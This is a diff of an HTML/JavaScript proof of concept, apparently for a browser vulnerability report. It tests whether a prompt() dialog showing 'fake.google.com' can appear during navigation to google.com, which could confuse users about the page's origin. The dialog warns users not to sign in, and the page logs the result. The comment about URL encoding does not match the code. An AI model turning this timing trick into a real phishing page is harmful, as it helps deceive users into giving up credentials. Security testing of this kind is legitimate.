@@ -2,48 +2,42 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Origin Confusion – Dialog During Navigation</title>
+  <title>Address Bar Spoof PoC</title>
 </head>
+<body style="font-family:sans-serif; text-align:center; background:#111; color:#fff;">
+<h2>Safe Address Bar Spoof PoC</h2>
+<button id="start" style="font-size:20px;padding:12px 24px;">Start Test</button>
 
-<body style="background:#111;color:#fff;text-align:center;font-family:sans-serif;">
-<h2>Origin Confusion PoC (Desktop)</h2>
-
-<button id="start" style="font-size:22px;padding:12px 24px;">
-Start Test
-</button>
-
-<pre id="log" style="text-align:left;margin:20px auto;width:90%;max-width:900px;
-background:#000;padding:14px;border-radius:8px;color:#0f0;"></pre>
+<pre id="log" style="text-align:left; margin:20px auto; width:90%; max-width:800px;
+background:#000; padding:16px; border-radius:8px; color:#0f0;"></pre>
 
 <script>
-const log = m => {
-  document.getElementById("log").textContent += m + "\n";
-  console.log("[PoC]", m);
+const log = msg => {
+  document.getElementById("log").textContent += msg + "\n";
+  console.log("[PoC]", msg);
 };
 
 document.getElementById("start").onclick = () => {
-  log("[INFO] User interaction received");
+  log("[INFO] User clicked button");
 
-  // Step 1: Trigger top-level navigation
-  setTimeout(() => {
-    log("[INFO] Navigating to google.com");
-    location.href = "https://www.google.com";
-  }, 900);
+  // Contoh URL encoding untuk “spoof”
+  const fakeUrl = "https://google.com";
 
-  // Step 2: Dialog during navigation timing window
+  log("[INFO] Navigating to: " + fakeUrl);
+
+  // open in new tab / window
+  window.open(fakeUrl, "_blank");
+
+  // optional: show prompt for demo
   setTimeout(() => {
     try {
-      prompt(
-        "fake.google.com\n⚠️ Do not sign into your account",
-        ""
-      );
-      log("[BUG] Dialog shown during navigation ❌");
-    } catch (e) {
-      log("[OK] Dialog blocked ✔");
+      prompt("fake.google.com\n⚠️ Do not sign into your account", "");
+      log("[BUG] Prompt shown during URL trick ❌");
+    } catch(e) {
+      log("[OK] Prompt blocked ✔");
     }
-  }, 950);
+  }, 800);
 };
 </script>
 </body>
 </html>
-
